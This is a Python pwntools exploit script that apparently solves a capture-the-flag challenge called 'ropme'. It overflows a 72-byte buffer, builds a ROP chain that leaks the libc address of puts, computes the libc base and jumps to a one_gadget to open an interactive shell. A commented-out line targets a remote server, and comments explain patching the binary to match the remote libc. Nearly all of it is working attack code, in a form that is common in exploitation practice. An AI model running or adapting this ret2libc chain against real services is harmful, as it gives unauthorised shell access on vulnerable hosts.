#!/bin/env python3
from pwn import *

# the remote runs a slightly different version of libc,
# the easiest way around it is to patch ropme with
# the correct version. will add more on this in
# update.
# you can still do remote if you are lucky on a certain step...

exe = ELF('./ropme_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

p = process(exe.path)
#p = remote('64.227.39.88', 32705)

offset = b'A'*72

rop = ROP([exe])
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

puts_plt = exe.plt['puts']
puts_got = exe.got['puts']
main_plt = exe.symbols['main']

##################### libc leak #####################
payload = offset
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_plt)

p.sendlineafter(b'dah?\n', payload)
puts_got_leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))

log.info(f'puts_got_leak: {hex(puts_got_leak)}')
######################################################
#           HACKED EXPLANATION
#
# So, after some troubles (explained in original notes)
# I was provided with this working solution using one_gadget
# which, I still don't really know what it does, I think it just
# uses the correct gadget somehow...anyway.
# What I ended up doing to get this hack is to download any version
# of libc, after finding suitable versions searching for the
# memory addresses of puts and fgets like in the original.
# Then moving it to this folder and renaming it to libc.so.6.
# Next we have to do some patching, using elfpatch and binutils, or it can be
# automated using pwninit, which is what I did:
#
# pwninit --bin ropme --libc libc.so.6
#
# This generates the patched ropme file as well as ld-2.23.so, which
# you don't need for either version, so you can delete it as well as
# solve.py it generates that's just a template.
# After doing the above, this script will work for you now you have the
# patched ropme.
#
# That is how this patched hacky way of doing it works.
# ...apart from the one_gadget line...idk, don't ask me about that lol


# libc_base = puts_got_leak - libc.symbols['puts']
# system_offset = libc.symbols['system']
# binsh_offset = next(libc.search(b'/bin/sh'))
# system = libc_base + system_offset
# binsh = libc_base + binsh_offset

# payload = offset + p64(pop_rdi) + p64(binsh) + p64(system)

libc_base = puts_got_leak - libc.symbols['puts']
one_gadget = 0x45216 + libc_base
payload = offset + p64(one_gadget)

# gdb.attach(p, gdbscript='i f')
p.sendlineafter(b'dah?\n', payload)
p.interactive()
